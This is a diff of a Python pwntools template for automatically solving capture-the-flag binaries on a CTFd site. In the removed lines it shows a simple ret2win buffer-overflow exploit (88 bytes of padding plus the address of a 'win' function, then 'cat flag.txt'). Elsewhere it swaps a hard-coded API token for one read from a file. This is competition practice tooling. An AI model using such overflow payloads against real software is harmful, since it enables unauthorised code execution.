@@ -1,18 +1,16 @@
-# ----------- ACE Template ----------- #
-
 from pwn import *
 import subprocess
 import requests
-import angr
 import os
 import json
+import re
 
 # This helps debugging to shutup pwntools
 # context.log_level = 'ERROR'
 # logging.disable(logging.CRITICAL)
 
-# Access token for team to make api calls -- CHANGE THIS
-access_token = "INSERT API TOKEN"
+# Access token for team to make api calls
+access_token = open('ctfd_access_token', 'r').read().strip()
 
 # URL of ctfd --
 ctfd_url = "https://ace.ctfd.io"
@@ -34,44 +32,8 @@ flag_pattern = r'flag\{[^}]+\}'
 # ------------------------------------------------- #
 
 def exploit(binary, chal_id):
-    e = ELF(f"./{binary}")
-    p = process(f"./{binary}")
-    r = ROP(e)
-
-    # No im not giving you the method for
-    # finding the overflow length
-    overflow = b"A" * 88
-
-    # Figure out the vuln by finding helpful things in bin
-    # find_vuln()
-    # Ex. if e.sym['win']
-
-    # Find win...if it exists
-    win = p64(e.sym["win"])
-
-    # I miss movaps
-    # ret = p64(r.find_gadget(['ret'])[0])
-
-    # This will stay the same
-    p.recvuntil(b'>>>\n')
-
-    # Creating an intricate payload
-    payload = overflow + win
-
-    p.sendline(payload)
-    # Get that flag...hopefully
-    p.sendline("cat flag.txt")
-    flag = re.findall(flag_pattern, p.recvall(timeout=0.2).decode())
-    p.close()
-
-    # Check if you solved it
-    if flag:
-        # print(f"Found flag {file_path}: {flag[0]}")
-        send_exploit(binary, payload, chal_id)
-
-    else:
-        print(f"Couldn't exploit {file_path}!")
-
+    # TODO: Everything
+    print("Nothing here yet")
 
 
 # ------------------------------------------------- #
@@ -89,7 +51,7 @@ def send_exploit(binary, payload, chal_id):
     if flag:
         send_flag(flag, chal_id)
     else:
-        # This comment is for Curtice <3
+        # This comment is for Chandler <3
         print("Remote Exploit didn't work!")
 
 # ------------------------------------------------- #
